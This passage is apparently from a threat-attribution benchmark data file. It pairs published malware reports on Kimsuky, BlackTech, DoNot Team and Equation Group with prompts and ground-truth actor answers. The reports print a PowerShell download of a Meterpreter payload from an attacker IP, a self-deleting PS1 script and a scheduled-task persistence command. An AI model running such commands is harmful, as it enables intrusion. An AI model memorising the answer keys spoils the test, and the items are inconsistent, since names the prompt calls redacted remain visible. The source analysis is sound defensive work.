stolen from the victim system. The value of each field is set differently depending on the purpose of the communication and the type of data to be transmitted, and the payload is located after the size_payload field. The configured data is XORed and Base64 encoded and sent to the C&C server through the HTTP protocol. The common structure for communication is shown in Figure 7, and the meaning of each field is described in Table 5.\nAfter organizing the data to be sent into a structure, it performs an XOR operation followed by Base64 encoding using a hardcoded 4-byte key in the binary. The encoded result is sent to the C&C server in the format “a=[Encoded_Data]”.\n•\tXOR Key: DD 33 99 CC\nThe final stolen data is sent as follows:\n•\tSteal data => Encrypt file(RC4+RSA) => Encode structure used for communication(XOR+Base64) => Pass as a parameter\nTroll Stealer sends the “init” string in the payload to the C&C server only the first time it communicates, and only when it receives the “ok” string in response does it continue to leak the stolen data.\nIn this case, there are a total of four communications per exfiltration of configuration or stolen items: the first communication is to perform the ping function, and the second and third communications are sent with the same data in the payload. However, we can see that the value of the status_type field is configured differently. Finally, the fourth communication includes the stolen filename in the payload and sets the value of the send_type field to 5. Once the file is successfully sent to the C&C server, delete the encrypted file in the %appdata%\\local\\ path.\n6. Self-deletion\nAfter executing the malware, it creates a PS1 file in the .tmp directory and runs it via the powershell.exe, which deletes Troll Stealer itself.\n•\t.PS1 save path: %USERPROFILE%\\.tmp\\{Random}.ps1\n•\tCommand: powershell.exe -executionpolicy bypass -File [ps1 file]\n•\t.PS1 file contents\n$target = {Stealer Path}\nfor ($i = 0; $i -lt 50; $i++)\n{\n Remove-Item $target -Force\n Remove-Item $PSCommandPath -Force\n if (!(Test-Path $target) -and !(Test-Path $PSCommandPath))\n {\n  break\n }\n Start-Sleep -Seconds 2\n}\nAttribution\nS2W speculates that the Kimsuky group may be behind the distribution of this malware based on the group’s recent active use of Go-based malware and the similarity of the code to existing AppleSeed and AlphaSeed malware.\nCorrelation with AppleSeed/AlphaSeed\nThe path that the dropper malware drops Troll Stealer and the filename format it creates appear similar to the path and filename of AppleSeed, which was disclosed by ASEC.\nIn addition, the hardcoded commands it executes to collect infected system information are identical to those found in the AppleSeed malware discovered in May 2023. However, in the case of the recently discovered malware, two additional commands were added to obtain information about the user’s accounts and sessions.\n•\tnet user\n•\tquery user\nIn addition, the same type of mutexes identified in the Troll Stealer Dropper malware were found in both AppleSeed Dropper and Meterpreter, which have been used by the Kimsuky group in the past.\nTroll Stealer then compresses the folder where the stolen files are stored and encrypts them using RSA and RC4 algorithms. We found that the combniation and the encryption execution flow are the same as those used by AlphaSeed.\nFurthermore, the Go language library used to capture the victim system’s desktop screen was identified as the same kbinani package also used by AlphaSeed.\n•\thttps://github.com/kbinani/screenshot\nAnother golang-based backdoor (GoBear)\nIn addition to the Troll Stealer, another Go language-based backdoor malware signed with a legitimate “D2innovation Co.,LTD certificate” was also found.\n•\tMD5: 87429e9223d45e0359cd1c41c0301836\n•\tC&C: hxxp[:]//coolsystem[.]co.kr/admin/mail/index.php\n•\tReference: Kimsuky (APT-Q-2) secret theft operation disguised as software installation package\nThe malware performs malicious behaviors based on the commands it receives from the C&C server, and the strings contained in the names of the functions it calls have been found to overlap with the commands used by BetaSeed, a C++-based backdoor malware used by the Kimsuky group. The DLL version of BetaSeed also steals information from the victim system and performs additional malicious actions based on the commands it receives from the C&C server.\n•\tMD5: d6abeeb469e2417bbcd3c122c06ba099\n•\tReference: 수입 신고서를 위장하여 국내 연구 기관을 노리는 Kimsuky\nHowever, the 2 malware were separated into different types because they were written in different languages and there were no similarities in the code other than the strings in the function names.\nIt is noteworthy that GoBear adds SOCKS5 proxy functionality, which was not previously supported by the Kimsuky group’s backdoor malware. Furthermore, the fact that the mutex used in the previous AppleSeed malware was reused after two years without being updated suggests that the author of the Troll Stealer malware based on AppleSeed may have made a mistake.\nConclusion\n•\tS2W threat research and intelligence center Talon has hunted for and analyzed a sample of a new malware from the Kimsuky group, and named Troll Stealer.\n•\tTroll Stealer is written in Go and identified as an Info-stealer malware that steals information from infected systems (SSH, FileZilla, C drive files/directories, browsers, system information, screen captures).\n—Troll Stealer is distributed by dropping and executing from a Dropper disguised as SGA Solutions’ Trusted PKI installer.\n•\tThe dropper runs as a legitimate installer alongside the malware, and both the dropper and malware are signed with a valid, legitimate “D2innovation Co.,LTD” certificate, suggesting that the company’s certificate was actually stolen.\n•\tTroll Stealer includes the ability to steal the GPKI folder on infected systems, which suggests that the campaign may have been targeting devices within administrative and public organizations in South Korea\n— The Kimsuky group has no known history of hijacking GPKI folders or utilizing the SOCKS5 protocol in the past, so it is possible that they have set new targets, or that another group with access to the source code for AppleSeed/AlphaSeed created Troll Stealer and GoBear.\n•\tS2W believes that the Kimsuky group is likely behind the distribution of this malware based on the group’s active use of Go-based malware and the many similarities found between Troll Stealer and the existing AppleSeed and AlphaSeed malware.\n•\tIn addition to Troll Stealer, additional malware signed with the same legitimate certificate was found, so it is possible that malware signed with that certificate may be distributed in the future.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Kimsuky"
    },
    {
        "url": "https://asec.ahnlab.com/en/53046/",
        "Text": "Kimsuky Group Using Meterpreter to Attack Web Servers\nAhnLab Security Emergency response Center (ASEC) has recently discovered the distribution of malware targeting web servers by Kimsuky group. Kimsuky is a threat group deemed supported by North Korea and has been active since 2013. At first, they attacked North Korea-related research institutes in South Korea before attacking a Korean energy corporation in 2014. Since 2017, their attacks have been targeting countries other than South Korea as well. [1] ASEC has been providing the analysis of various cases of Kimsuky attacks on the ASEC Blog, mainly spear phishing attacks which involved malicious file attachments to emails in MS Office document files[2],  OneNote [3], or CHM [4]file formats. Kimsuky group usually uses social engineering attacks like the aforementioned spear phishings, but this post will cover the attack cases that targeted web servers. After a successful breach, Kimsuky installed the Metasploit Meterpreter backdoor malware. There have also been identified logs of a proxy malware developed in GoLang being installed. \n1.\tAttack Cases Targeting IIS Web Servers\nThe attack target was a Windows IIS web server of a Korean construction company and is thought to have a vulnerability not applied or be inadequately managed. The threat actor breached the IIS web server and executed a Powershell command. The following is a log from AhnLab Smart Defense (ASD) which shows w3wp.exe, a Windows IIS web server process, using Powershell to download an additional payload from outside. \nThe executed Powershell command is as follows, and the downloaded “img.dat” file is a backdoor malware also known as Metasploit Meterpreter. \n> powershell.exe invoke-webrequest -uri “hxxp://45.58.52[.]82/up.dat” -outfile “c:\\programdata\\img.dat” \nAfterward, the threat actor used Meterpreter to install proxy malware additionally. Powershell command was used here as well.\n1.\tMeterpreter Malware\nMetasploit is a penetration testing framework They are tools that can be used to inspect security vulnerabilities for networks and systems of companies and organizations, providing various features for each penetration test stage. Meterpreter is a backdoor provided by Metasploit and can perform various malicious behaviors by receiving commands from the threat actor. Because Metasploit is an open-source tool, it is being favored by various threat actors, and this is the same for the Kimsuky group. The ASEC Blog also covered cases of the Kimsuky group using Meterpreter alongside AppleSeed in their attacks. [5] [6] In addition, aside from the fact that the C&C address used in the attack had been used by the Kimsuky group in the past, the method of having the regsvr32.exe process running the malware is the same as the method used by the Kimsuky group from the past. The malware used in the attacks is in DLL file format and runs after being loaded by the regsvr32.exe process.\nWhat’s different than usual is that the Meterpreter Stager is developed in GoLang. In the past, the Kimsuky group developed their own malware, or packed it with a packer such as VMProtect when distributing the malware. The proxy malware is also developed in GoLang, and the malware will be discussed below. We can assume this as recently distributed malware being developed in GoLang to evade detection.\n1.\tProxy (GoLang) Malware\nAfterwards, Meterpreter receives a command from the threat actor, executing a Powershell command and installing additional malware. The malware downloaded through the Powershell command is malware that has a proxy feature. Additionally, Kimsuky group has continuously been using proxy malware in their attack processes in the past. [7] A trait unique to this malware would be that it is developed in GoLang, unlike past versions.\nThe proxy malware used in this attack receives 2 IP addresses and port numbers from the command line argument to relay them. A difference between this and past proxy tools is that the string “aPpLe” is used as a signature presumed to be used for a verification process during communications. Considering the fact that the RDP port “127.0.0.1:3389” is used as an example when the malware is executed, it is assumed that the purpose of the threat actor using a proxy malware is for RDP connection to the infected system in later stages.\n1.\tConclusion\nKimsuky group’s attack targeting Windows IIS web server has recently been found. Looking at the log, it is presumed that the Kimsuky group attacks web servers that are poorly managed or have vulnerabilities with patches not applied. After a successful breach, Meterpreter was installed in the target systems for the threat actor to gain control over the web server. Thus, server managers must patch the server so that it is up to date and practice prevention of known vulnerabilities being exploited. Moreover, for externally open servers, protection software must be used to restrict external access. Also, V3 should be updated to the latest version so that malware infection can be prevented. File Detection – Backdoor/Win.Meterpreter.C5427507 (2023.05.15.02) – HackTool/Win.Proxy.C5427508 (2023.05.15.02) \n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Kimsuky"
    },
    {
        "url": "https://blogs.jpcert.or.jp/en/2022/09/bigip-exploit.html",
        "Text": "F5 BIG-IP Vulnerability (CVE-2022-1388) Exploited by BlackTech\nAround May 2022, JPCERT/CC confirmed an attack activity against Japanese organizations that exploited F5 BIG-IP vulnerability (CVE-2022-1388). The targeted organizations have confirmed that data in BIG-IP has been compromised. We consider that this attack is related to the activities by BlackTech attack group. This blog article describes the attack activities that exploit this BIG-IP vulnerability.\nAttack code that exploits the BIG-IP vulnerability\nBelow is a part of the attack code used in the attack. This attack tool enables attackers to execute arbitrary commands on BIG-IP.\nFigure 1 (grayed-out part) shows that multiple domestic BIG-IP IP addresses were listed in the attack code and that they were the target of the attack. The attack code as well as malware such as TSCookie and Bifrose, which is used by BlackTech, were found on the server used by the attacker.\nIn addition to known malware, new unidentified malware was discovered on this server, which is described in the following section.\nHipid\nThis malware targets Linux OS, and two types have been identified: one with a CPU architecture compatible with ARM and the other with x64. It is unclear what type of device it was created to run on, but it is possibly intended for IoT devices.\nThis malware has a function to receive commands from the C2 server and execute arbitrary commands. It uses a host command, not a system call, to resolve host names.\nThere are also two types in terms of sending data: one of them sends data with RC4 encryption and the other sends data as it is. Some samples of the former have a unique behavior of sending the S-Box data used for encryption to the server.\nDistribution of Hipid using malicious PyPI packages\nAlthough this is not directly related to the attack that exploits the BIG-IP vulnerability, JFrog reports that the same type of malware as the one described above was registered as a malicious PyPI package in the past[1]. Figure 6 shows the contents of the malicious package's setup.py. The attacker may not have taken control of the existing package but installed malware on PyPi to install the package on the compromised system.\nThe malware itself was included in __init.py__ encoded in Base32 as shown in Figure 7. The malware is installed after decoding, overwriting /usr/sbin/syslogd.\nIn addition, the mount command is used for the malware process to run to hide the process, as shown in Figure 8.\nIn closing\nThe incident described in this report is currently under control and is no longer influential in many environments. BlackTech has been observed in a number of cases in recent years in which vulnerabilities in externally accessible systems are exploited. In the case described here, the vulnerability was exploited shortly after it was disclosed, and thus patch management continues to be important.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "BlackTech"
    },
    {
        "url": "https://jp.security.ntt/tech_blog/102hf3q",
        "Text": "Introduction\nBlackTech has been actively attacking, some attack cases against Japanese companies were observed. BlackTech uses a new malware for these attack cases. We call it “Flagpro”. We are sharing its overview, timeline and detailed analysis result in this article.\nAttack overview\nFlagpro is used in the initial stage of attacks to investigate target’s environment, download a second stage malware and execute it. An attack case using Flagpro starts with a spear phishing e-mail. The message is adjusted to its target organization. It is disguised as an e-mail communication with target’s business partner. This means the attackers probed deeper into their target before attacking.\nThe attackers attach a password protected archived file (ZIP or RAR) to the email, and they write its password in the message. The archived file includes an xlsm format file and it contains a malicious macro. If a user activates the macro, a malware will be dropped. They also adjust the contents of the xlsm file to the target. Therefore, it is not easy to feel at odds with the file sent by the attacker.\nAfter the macro is executed, it creates an EXE file in startup directory. This EXE file is “Flagpro”. In the most cases, this created EXE files are named “dwm.exe”. When the system launches next time, Flagpro, which was placed in startup directory as “dwm.exe”, will be executed.\nFlagpro communicates with a C&C server, and it receives commands to execute from the server, or Flagpro downloads a second stage malware and then executes it. The attackers check the target’s environment whether it is suitable for running the second stage malware or not. If they determine to attack the target, another malware sample will be downloaded and executed.\nTimeline\nWe have observed attack cases using Flagpro against multiple companies (Defense, Media, Communications) several times. In October 2020, a sample related to Flagpro was submitted to an online service. Therefore, Flagpro may have already been used for attacking cases at that point.\n\n\nFlagpro functions\nIn July 2021, our SOC observed new Flagpro using MFC(Microsoft Foundation Class) library for its implementation. MFC library had not been used for old Flagpro. This Flagpro had classes such as ”CV20_LoaderApp” and ”CV20_LoaderDlg”. We assume that the role of Flagpro is a downloader and the sample version was 2.0 from these class names.\nWe call this sample using MFC as “Flagpro v2.0” and old one as “Flagpro v1.0” in this article.\nFollowing list indicates Flagpro’s main functions:\n•\tDownload and execute a tool\n•\tExecute OS commands and send the results\n•\tCollect and send Windows authentication information\nThese commands are implemented in a member function of CV20_LoaderApp class in Flagpro v2.0.\nOnce Flagpro is launched, it communicate with a C&C server and executes the received commands as shown in the above list. After designated interval, it repeats this behavior.\nRegarding to downloading and executing a tool, Flagpro stores the downloaded file in file path “%Temp%\\~MY[0-9A-F].tmp” first. Then, Flagpro adds extension “.exe” to the name of stored file and executes the file.\nIn the implementation of Flagpro v1.0, if a dialog titled “Windows セキュリティ” is displayed when Flagpro accesses to an external site, Flagpro automatically clicks OK button to close the dialog. This handling also works when the dialog is written Chinese and English. It can indicate the targets are Japan, Taiwan, and English-speaking countries. Flagpro v2.0 checks whether both username and password are filled in a dialog as an additional feature before clicking the OK button.\nFlagpro v2.0 has another new function. If a dialog title is “Internet Explorer [7-11]” (the number after “Internet Explorer” depends on what version the user users) when Flagpro accesses to an external site, Flagpro sends WM_CLOSE message to close the dialog.\nWe assume that these functions, which close a dialog automatically, are implemented to reduce a risk that a user detects an external connection by Flagpro.\nIn Flagpro v2.0, the same codes in below figure are repeatedly inserted to hide important as a handy obfuscation technique:\n\nReceived commands\nThe received commands from a C&C server are encoded with Base64. Following format is the decoded command about Flagpro v2.0:\nDownload Command field consists of two flags(Exec and Yes) and URL path like following:\nFirst string “Exec” is the action flag. If it is not included in both Download Command fields in the command, Flagpro will not execute the main processes such as downloading, executing OS commands, collecting authentication information, and so on. Next string “Yes” is the execution flag. If a Download Command field has “ExecYes”, Flagpro downloads and executes the file. If a command is “Exec/malware.html” like the above image, Flagpro only downloads a file.\nTime Interval field means a number of waiting time for the next command. The unit is millisecond.\nFollowing image is an actual example of the received commands:\nCommunications with C&C server\nConnection handlings to a C&C server about Flagpro v1.0 and v2.0 uses COM objects of Internet Explorer. Flagpro communicates with C&C server using HTTP.\nIn requesting commands, sending execution results of OS commands or collected authentication information, Flagpro accesses a C&C server with specific URL paths and queries. It encodes data with Base64 and sends to the C&C server. Following table shows relations between Flagpro’s activities and the URL paths and queries.\nWhen Flagpro downloads a tool, there is no specific URL path because it uses the file name on the server.\nFollowing image shows a traffic when Flagpro v2.0 connects to a C&C server:\n\nAs of July 2021, we do not know why, but we observed a response “Hello Boy!” from the C&C server, when we access to the arbitrary paths other than the URL paths shown in the table above. Following image is an example of the response:\nDetections\nTo detect attacks using Flagpro, it is effective to create and install custom signature both on network and endpoint devices. For the network detection, Flagpro’s characteristic URL paths are useful such as index.htmld?flag=[Base64 string] and index.htmld?flagpro=[Base64 string].\nFor the endpoint detection, naming rules of temporary files that Flagpro create such as %TEMP%\\~MY[0-9A-F].tmp and %TEMP%\\~MY[0-9A-F].tmp.exe are effective. In addition, the investigation commands after Flagpro establishes the connection with the C&C server like following are also useful for detection. Following commands are a part of examples:\nConclusion\nWe have observed attack cases using Flagpro against Japan since October 2020. The attack techniques have not changed a lot, but BlackTech uses more evading techniques. For example, they adjust decoy files and file names to their target and check carefully target’s environment. Recently, they have started using other new malwares called “SelfMake Loader” and “Spider RAT”. It means that they are actively developing new malwares. Therefore, you need to pay attention to the attacks from BlackTech.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "BlackTech"
    },
    {
        "url": "https://blog.morphisec.com/apt-c-35-new-windows-framework-revealed",
        "Text": "APT-C-35 Gets a New Upgrade\n\nThe DoNot Team (a.k.a APT-C-35) are advanced persistent threat actors who’ve been active since at least 2016. They’ve targeted many attacks against individuals and organizations in South Asia. DoNot are reported to be the main developers and users of Windows and Android spyware frameworks [1][2][3].\nMorphisec Labs has tracked the group’s activity and now exclusively details the latest updates to the group’s Windows framework, a.k.a. YTY, Jaca. In this blog post, we briefly discuss the history of the DoNot team and shed light on updates revealed by the latest samples found in the wild. \n\nAPT-C-35/DoNot Background\nThe DoNot Team is consistent with their TTPs, infrastructure, and targets. They’re also well known for their continuous updates and improvements to their toolkit. \nThe group mainly targets entities in India, Pakistan, Sri Lanka, Bangladesh, and other South Asian countries. They focus on government and military organizations, ministries of foreign affairs, and embassies.\nFor initial infection, the DoNot Team uses spear phishing emails containing malicious attachments. (Related: spear-phishing campaigns have become the preferred delivery method for ransomware.) To load the next stage they leverage Microsoft Office macros and RTF files exploiting Equation Editor vulnerability and remote template injection.\nKnown TTPs, or malware commonalities, include:\n•\tModular architecture where each module is delivered in a separate file\n•\tFunctionalities: file collection, screenshots, keylogging, reverse shell, browser stealing, and gathering system information\n•\tVarious programming languages such as C++, .NET, Python, etc.\n•\tUtilizing Google Drive to store command and control (C2) server addresses\n•\tMultiple domains are used for different purposes throughout the infection chain\nAll previously known framework variants attributed to the DoNot Team share similar attributes.\nMorphisec Labs has identified a new DoNot infection chain that introduces new modules to the Windows framework. In this post we detail the shellcode loader mechanism and its following modules, identify new functionality in the browser stealer component, and analyze a new DLL variant of the reverse shell.\nMapping a Malware Route\nDoNot’s latest spear phishing email campaign used RTF documents and targeted government departments, including Pakistan’s defense sector. When the RTF document is opened, it tries to fetch a malicious remote template from its C2 by sending an HTTP GET request in the form: <domain>/<X>/<Y>.php. If the User-Agent for that request doesn’t contain MSOffice, which is case sensitive and added by default in Office applications, the C2 returns a decoy document with empty content. Otherwise, it downloads and injects a macro weaponized document. This technique may trick a security solution that tries to scan the URL without the MSOffice User-Agent header and mark it as clear. The remote template URLs are active for a limited period of time which makes analysis difficult.\nPre-Shellcode Execution \nWhen a remote template is injected, it lures the victim to enable editing and content to allow the malicious macros to execute. Once macros are enabled, the Document_open routine executes and starts with a for loop to delay the malicious code execution, and then calls to the appropriate function based on the Winword.exe bitness.\nThe function injects a shellcode (32-bit/64-bit) into the process memory and invokes it. The shellcode is injected using the following three WinAPI functions:\n1.\tZwAllocateVirtualMemory—Allocates virtual memory with Execute/Read/Write permission\n2.\tMultiByteToWideChar—Maps the shellcode character string to UTF-16\n3.\tEnumUILanguagesA—Passes the shellcode as a callback parameter. Other variants also use the Internal_EnumSystemCodePages WinAPI\nDelivering the Payload\nBefore the execution of the payload, the shellcode decrypts itself using a simple decryption routine—not followed by xor with a two-byte key, which changes between stages. After the shellcode is invoked, it starts execution by decrypting the rest of the shellcode bytes and passing the execution to the next stage. \n\nShellcode decryption routine before decrypting the next chunk\nNext, the shellcode downloads an encrypted blob from its C2: <domain>/<X>/<Y><Z>.ico (for the 32-bit shellcode) or <domain>/<X>/<Y><Z>.png (for the 64-bit shellcode) and decrypts it. The decrypted blob is the second-stage shellcode, and like the first-stage shellcode, it starts by decrypting the rest of the bytes in the shellcode before passing execution to the next stage.\nIn the 64-bit version of the first stage shellcode, the actor left what seem to be strings belonging to the configuration of the shellcode builder:\n'sm\\INCLUDE\\PCOUNT\\SHELL32.INC'\ninclude 'c:\\Fasm\\INCLUDE\\WIN32AXP.INC'\ninclude 'Shellcodes\\MyAssemblyMacros\\MyAssemblyMacrosMain.INC'\n;if debugging turn this bit on\ndebug = 0\n \nxor_key_main = 0xAD\nxor_key_payload = 0xFE\nxor_key_url = 0xCE\n \nexpiry_year_date = 0x7e6070f\nmcafee_expiry_year_date = 0\navg_expiry_year_date = 0\nnorton_expiry_year_date = 0\nbitdefender_expiry_year_date = 0x7e6070f\neset_expiry_year_date = 0x7e60717\n \ndefine_real_variable local_path_exe_env, '%tmp%\\..\\winsvsc.exe',0\ndefine_real_variable tmp_env_path, '%tmp%\\document.doc',0\ndefine_real_variable clear_registry, 'reg delete \\\"HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Resili\nThese configurations include XOR keys used in the second-stage shellcode, and expiry dates for security products such as McAfee, Norton, and Bitdefender. Some strings appear to be the attacker's local paths and debugging flags.\nNext, the shellcode checks for security solutions by validating the existence of their drivers’ .sys, located under C:\\Windows\\System32\\drivers. If security solutions are present, the shellcode compares the current date to an expiry date configured in the shellcode builder and operates accordingly. \nFor instance, in the researched sample, [1] - [7] denote the following values:\n[1] hxxp://mak.logupdates.xyz/DWqYVVzQLc0xrqvt/HG5HlDPqsnr3HBwOKY0vKGRBE7V0sDPdZb09n7xhp0klyT5X.mp3\n[2] hxxp://mak.logupdates.xyz/DWqYVVzQLc0xrqvt/HG5HlDPqsnr3HBwOKY0vKGRBE7V0sDPdZb09n7xhp0klyT5X.doc\n[3] %tmp%\\syswow64.dll\n[4] %tmp%\\document.doc\n[5] Qoltyfotskelo\n[6] schtasks.exe /create /tn wakeup /tr \\\"rundll32 %tmp%\\syswow64.dll, HPMG\\\" /f /sc DAILY /st 11:00 /ri 10 /du 24:00\n[7] cmd.exe %tmp%\\syswow64.dll\nThe malware will execute values depending on whether it finds a security solution. For example, the following table demonstrates the operation performed based on the driver found and the comparison between the current date and expiry date:\nSecurity solutions and corresponding actions according to the expiry date\nIf none of the drivers are found on the victim’s machine, the shellcode executes the default routine which downloads from [1], and modifies the three first bytes back to their original form. This technique is used to evade security solutions and keep them from scanning the executable. It then executes the exported function [5].\nMorphisec Labs hasn’t found a clear motive for the included expiry date and driver check. When malware checks for security solutions in conjunction with a certain date, it’s often because the authors tested their bypass against the latest version. Future updates would react differently as they’re not tested. Another common malware behavior after finding security solutions is to evade or abort execution. In this case, the malware slightly modifies its behavior but mostly continues its malicious activity. \nModule Delivery and Execution\nThe initial infection executes the main DLL. This DLL is responsible for beaconing back to the C2 server that the infection was successful and downloading the next component in the framework. The following figure outlines the high-level relationships between the components in the rest of the execution:\n\nComponent relationships with new/updated components highlighted\nMain DLL (pgixedfxglmjirdc.dll) Beaconing\nDelivered by the shellcode, the main DLL usually contains two exported functions. In our case,  Qoltyfotskelo (referred to as the first exported function) and Yolueorgw (referred to as the second exported function).\nThe first exported function is responsible for installing persistence and checking for security solutions. Persistence is achieved by setting a new Scheduled Task (via COM objects) that runs every three minutes. The action assigned to the task is to run the second exported function—Yolueorgw.\n\nThe second exported function is responsible for beaconing back to the C2 server. Before it does so, it creates a mutex to avoid multiple instances running at the same time, and performs VM detection using WMI queries:\n\nLooking for VMware, VMware Virtual Platform, and VirtualBox in csproduct name\nThe malware then uses Windows Management Instrumentation (WMI) to collect basic system information such as the name, operating system caption, build number, and processor ID:\n\nBeaconing information sent to the server before encryption\nTo that information, it concatenates the victim’s ID and the folder names under C:\\Program Files and C:\\Program Files (x86) to learn which software is installed on the system.  What we refer to as victim ID is a concatenation of Username-ComputerName-ProcessorId. This string identifies the victim in later communication with the C2 server. \nOnce this is done the malware can encrypt the victim’s data and beacon back to its C2 server. The malware and server encryption is AES-256 with two sets of embedded keys and IVs. The encrypted data is then encoded using Base64. \nThe beaconing process is divided into two steps shown below:\n\nBeaconing messages for downloading the next component\nThe first message to the server is sent as a POST request to the first URL path (<first_path>) embedded in the binary. The body contains the following encrypted information:\nName: CPU Name>Caption: OS Version>Build: Build Number V:|||Username-ComputerName-ProcessorId||||||O|||3|||Folder #1 Name?Folder #2 Name…\n\nDepending on the server’s response, the malware will either stay idle and keep the beaconing loop, or download the next stage. If the latter, the malware sends another POST request to a second URL path (<second_path>) on the same server. This message contains the following encrypted information: Username-ComputerName-ProcessorId|||Next stage DLL name\nThe response to that request is the next stage DLL. To execute the next stage, the malware creates another scheduled task and removes the previous one using a clean-up .bat file (see ms.bat in the Appendix section).\nModule Downloader (WavemsMp.dll)\nThe main purpose of this stage is to download and execute the modules used to steal the user’s information. To understand which modules are used in the current infection, the malware communicates with another C2 server. The malware fetches the new address from an embedded link that refers to a Google Drive document containing the encrypted address:\n\nDownload the encrypted C2 server address from Google Drive\n\nThe decryption of the C2 address downloaded from Google Drive\nThis architecture allows the authors to frequently update their C2 servers without needing to redeliver the binary. After the C2 server address is decrypted, the malware sends a POST request to it with the encrypted victim’s ID in the request body. The response is the modules’ configuration:\n\nThis framework’s modularity stands out. The configuration controls which modules to download and execute without needing to update the binary. Morphisec Labs witnessed how this functionality came into play when a single binary communicated with different C2 servers and downloaded different modules across multiple runs over time.\nThe response specifies information about the modules, delimited by | (pipeline) where each part has the following format:\nModule name>Module size>Should download?>Export name to execute>Additional parameters\nAdditionally, there are special characters the malware looks for such as:\n•\tT?<file_name>?<file_data>—creates a file at %Temp%\\usdata and writes the content\n•\tM?<module_name>?<module_size>—downloads another file from the server to %ProgramData%\\MJDpnd\n•\tD?—unknown\nThe following figure illustrates the various modules and the interactions between them:\n\n•\tieflagKlo.dll—Keylogger module\n•\tieflagUl.dll—File uploader module which uploads the modules’ output\n•\tieflagSp.dll—Screenshot module\n•\tieflagTr.dll—File collection module\n•\tieflagUsd.dll—Removable disk file collection module\n•\tieflagBr.dll—Browser information stealer module\n•\tieflagRvso.dll—Reverse shell module\nFor more information about each module, refer to this analysis.\nUpgraded Browser Stealer Module \nWhile Morphisec Labs was researching the previously known modules, one module caught our attention—the browser stealer. The browser stealer was first introduced to the framework in late 2020 and since then, we haven’t seen any significant changes. Until now.\nInstead of implementing the stealing functionality inside the DLL, the module uses four additional executables downloaded by the previous stage (WavemsMp.dll). Each additional executable steals information from Google Chrome and/or Mozilla Firefox. The following table summarizes what data is stolen from each browser:\nStolen data by each executable (%base% = C:\\ProgramData\\DeviceStage\\usabrowatad)\nThe browser module executes each executable; they steal the data and store it in a temporary plain text file. The file is then encrypted and saved as a .rnm file which is later sent back to the C2 server by the file upload module ieflagUl.dll.\nReverse shell DLL implementation\nSo far the reverse shell module has been implemented as an executable file. But now the actor aligns with the rest of the modules and recompiles the reverse shell as a DLL. The functionality remains the same, opening a socket to the attacker’s machine (located at 162.33.177[.]41), creating a new hidden cmd.exe process, and setting the STDIN, STDOUT, and STDERR as the socket.\n\nThe shell runs until the actor sends the string “exit\n”\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "APT-C-35"
    },
    {
        "url": "https://www.pangulab.cn/en/post/the_bvp47_a_top-tier_backdoor_of_us_nsa_equation_group/",
        "Text": "The Bvp47 - a Top-tier Backdoor of US NSA Equation Group\nIn a certain month of 2013, during an in-depth forensic investigation of a host in a key domestic department, researchers from the Pangu Lab extracted a set of advanced backdoors on the Linux platform, which used advanced covert channel behavior based on TCP SYN packets, code obfuscation, system hiding, and self-destruction design. In case of failure to fully decrypt, It is further found that this backdoor needs the check code bound to the host to run normally. Then the researchers cracked the check code and successfully ran the backdoor. Judging from some behavioral functions, this is a top-tier APT backdoor, but further investigation requires the attacker's asymmetric encrypted private key to activate the remote control function. Based on the most common string \"Bvp\" in the sample and the numerical value 0x47 used in the encryption algorithm, the team named the corresponding malicious code \"Bvp47\" at the time.\nIn 2016 and 2017, “The Shadow Brokers” published two batches of hacking files claimed to be used by \"The Equation Group\". In these hacking files, researchers form Pangu Lab found the private key that can be used to remotely trigger the backdoor Bvp47. Therefor, It can be concluded that Bvp47 is a hacker tool belonging to \"The Equation Group\".\nThrough further research, the researchers found that the multiple procedures and attack operation manuals disclosed by \"The Shadow Broker\" are completely consistent with the only identifier used in the NSA network attack platform operation manual [References 3 and 4] exposed by CIA analyst Snowden in the \"Prism\" incident in 2013.\nIn view of the US government's prosecution of Snowden on three charges of \"spreading national defense information without permission and deliberately spreading confidential information\", it can be determined that the documents published by \"The Shadow Brokers\" are indeed NSA, which can fully prove that \"The Equation Group\" belongs to NSA, that is, Bvp47 is the top-tier backdoor of NSA. Besides the files of \"The Shadow Brokers\" revealed that the scope of victims exceeded 287 targets in 45 countries, including Russia, Japan, Spain, Germany, Italy, etc. The attack lasted for over 10 years. Moreover, one victim in Japan is used as a jump server for further attack.\nPangu Lab has a code named \"Operation Telescreen\" for several Bvp47 incidents. Telescreen is a device imagined by British writer George Orwell in his novel \"1984\". It can be used to remotely monitor the person or organization deploying the telescreen, and the \"thought police\" can arbitrarily monitor the information and behavior of any telescreen.\nThe Equation Group is the world's leading cyber-attack group and is generally believed to be affiliated with the National Security Agency of the United States. Judging from the attack tools related to the organization, including Bvp47, Equation group is indeed a first-class hacking group. The tool is well-designed, powerful, and widely adapted. Its network attack capability equipped by 0day vulnerabilities was unstoppable, and its data acquisition under covert control was with little effort. The Equation Group is in a dominant position in national-level cyberspace confrontation.\n\n",
